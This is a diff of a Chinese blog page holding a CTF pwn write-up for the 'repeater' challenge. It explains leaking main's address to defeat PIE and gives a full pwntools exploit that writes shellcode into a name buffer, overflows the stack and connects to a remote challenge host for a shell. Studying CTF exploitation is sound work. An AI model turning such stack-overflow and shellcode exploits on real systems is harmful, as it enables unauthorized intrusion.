@@ -457,7 +457,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    388
+                    391
                 </div>
                 
 
@@ -484,18 +484,19 @@
             <div id="articleContent">
                 <h2 id="repeater"><a href="#repeater" class="headerlink" title="repeater"></a>repeater</h2><p>遇到的第一题开PIE保护机制的pwn题，写一篇记录一下<br>PIE保护机制就是使程序的基地址随机化让我们无法进行shellcode的注入、rop链的搭建等，因此需要解题的第一件事就是找出程序的基地址，目标明确！<br>首先先将其checksec一下：<br><img src="/images/repeater-wp/1.png"><br>发现此题只开了PIE保护，NX保护机制没开可以实现shellcode注入，因此目标：找出基地址，并实现shellcode注入获取shell。<br>将其拖入IDA进行查看：<br><img src="/images/repeater-wp/2.png"><br>实际地址&#x3D;基地址+偏移地址，想要实际地址要知道基地址和偏移地址。在图中告诉我们s的偏移地址为rbp-30h，v5的偏移地址为rbp-10h二者相差20h（32字节），<br>read函数以s的地址为底可以溢出64个字节可以覆盖至返回地址！<br>对于sub_982（byte_202040，48ull）函数的功能单看应该是看不出来的但我们在终端中可以测试这个函数的功能<br><img src="/images/repeater-wp/3.png"><br>我们发现这个函数是进行输入名字的，通过浅浅分析它把名字放到了202040这个地址，可以将shellcode注入这里。<br>main函数偏移地址可以直接查看：<br><img src="/images/repeater-wp/4.png"><br>所以整体思路用exp来表示：</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>
-io<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./repeater'</span><span class="token punctuation">)</span>
+io<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'61.147.171.105'</span><span class="token punctuation">,</span><span class="token number">64894</span><span class="token punctuation">)</span>
+context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span>
 shellcode<span class="token operator">=</span>asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"name :"</span><span class="token punctuation">,</span>shellcode<span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'name :'</span><span class="token punctuation">,</span>shellcode<span class="token punctuation">)</span>
 payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">32</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">3281697</span><span class="token punctuation">)</span>
 io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"input :"</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
-io<span class="token punctuation">.</span>readuntil<span class="token punctuation">(</span><span class="token string">"But there is gift for you :"</span><span class="token punctuation">)</span>
-main_addr<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
-b_addr<span class="token operator">=</span>main_addr<span class="token operator">-</span><span class="token number">0xA33</span>
+io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"you :\n0x"</span><span class="token punctuation">)</span>
+main_addr<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token string">'12'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
+b_addr<span class="token operator">=</span>main_addr<span class="token operator">-</span><span class="token number">0xa33</span>
 shellcode_addr<span class="token operator">=</span>b_addr<span class="token operator">+</span><span class="token number">0x202040</span>
-payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">32</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">12</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>shellcode_addr<span class="token punctuation">)</span>
-io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"input :"</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
-io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+payload2<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x20</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">16</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>shellcode_addr<span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"input :"</span><span class="token punctuation">,</span>payload2<span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>获得shell。</p>
 
                 
@@ -728,18 +729,17 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="far fa-dot-circle"></i>&nbsp;本篇
-            </div>
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2022/12/26/repeater-wp/">
+                <a href="/2022/12/27/CGfsb-wp/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/16.jpg" class="responsive-img" alt="repeater_wp">
+                        <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="CGfsb_wp">
                         
-                        <span class="card-title">repeater_wp</span>
+                        <span class="card-title">CGfsb_wp</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -749,9 +749,9 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
                         
                     </div>
                     <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-12-26
-                            </span>
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2022-12-27
+                        </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -760,7 +760,6 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
                         </span>
                     </div>
                 </div>
-
                 
             </div>
         </div>
@@ -997,7 +996,7 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">4.8k</span>&nbsp;字
+                class="white-color">5.3k</span>&nbsp;字
             
             
             
